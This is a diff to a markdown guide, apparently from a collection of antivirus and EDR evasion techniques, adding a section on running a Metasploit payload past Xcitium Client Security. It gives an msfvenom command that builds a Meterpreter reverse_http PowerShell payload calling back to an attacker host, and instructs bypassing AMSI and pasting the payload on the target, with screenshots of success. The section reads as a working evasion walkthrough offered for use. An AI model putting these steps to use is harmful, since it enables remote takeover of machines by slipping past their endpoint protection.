@@ -21,3 +21,27 @@ Command:
 ### Execution
 
 ![](<../Xcitium Client Security/Images/amsi-bypass.png>)
+
+## Metasploit payload based on Powershell script
+
+Xcitium Client Security fails to observe commands that are executed in cmd and Powershell, because of this lack of observation it is possible to run a payload based Powershell script without needing any obfuscation. The only "problem" is the AMSI, which can be easily bypassed.
+
+On the attacker's machine, create the payload using the command:
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_http LHOST=<HOST> LPORT=<PORT> -f psh-reflection
+```
+
+![](<../Xcitium Client Security/Images/msfv-pl-gen.png>)
+
+On the target server, bypass AMSI using [command](https://github.com/MrEmpy/Awesome-AV-EDR-XDR-Bypass/tree/main/Xcitium%20Client%20Security#xcitium-client-security) shown above and then copy and paste the payload into Powershell.
+
+Note: in the screenshot at I encoded in Base64 to be in just one line.
+
+### Execution
+
+![](<../Xcitium Client Security/Images/ps-pl-msfv.png>)
+
+![](<../Xcitium Client Security/Images/ps-pl-success1.png)
+
+![](<../Xcitium Client Security/Images/ps-pl-success2.png)
